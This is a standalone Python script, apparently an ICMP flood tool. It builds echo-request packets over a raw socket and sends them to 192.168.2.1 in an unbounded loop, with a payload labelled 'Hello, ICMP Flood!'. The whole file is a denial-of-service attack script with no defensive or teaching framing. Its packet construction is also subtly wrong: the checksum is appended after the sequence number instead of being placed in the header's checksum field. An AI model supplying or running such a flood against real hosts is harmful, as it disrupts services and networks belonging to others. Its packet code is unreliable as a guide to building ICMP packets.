import socket
import os

# Set the target IP
target = "192.168.2.1"

# Create a raw socket and set the IP header fields
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

# Craft the ICMP packet (Echo Request)
# The ICMP type for Echo Request is 8
icmp_type = 8
icmp_code = 0
icmp_checksum = 0
icmp_id = os.getpid() & 0xFFFF
icmp_seq = 1

# The data payload of the ICMP packet
data = b"Hello, ICMP Flood!"

# Calculate the ICMP checksum (RFC 792)
def calculate_checksum(data):
    if len(data) % 2:
        data += b'\x00'
    words = [int.from_bytes(data[i:i+2], byteorder='big') for i in range(0, len(data), 2)]
    checksum = sum(words)
    checksum = (checksum >> 16) + (checksum & 0xFFFF)
    checksum = ~checksum & 0xFFFF
    return checksum

icmp_checksum = calculate_checksum(bytes([icmp_type, icmp_code, 0, 0]) + icmp_id.to_bytes(2, byteorder='big') + icmp_seq.to_bytes(2, byteorder='big') + data)

# Craft the complete ICMP packet
icmp_packet = bytes([icmp_type, icmp_code, 0, 0]) + icmp_id.to_bytes(2, byteorder='big') + icmp_seq.to_bytes(2, byteorder='big') + icmp_checksum.to_bytes(2, byteorder='big') + data

# Send the ICMP packet
while True:
    try:
        s.sendto(icmp_packet, (target, 0))
    except KeyboardInterrupt:
        break
    except socket.error:
        print("Socket error occurred. Check privileges or run with admin/root access.")
        break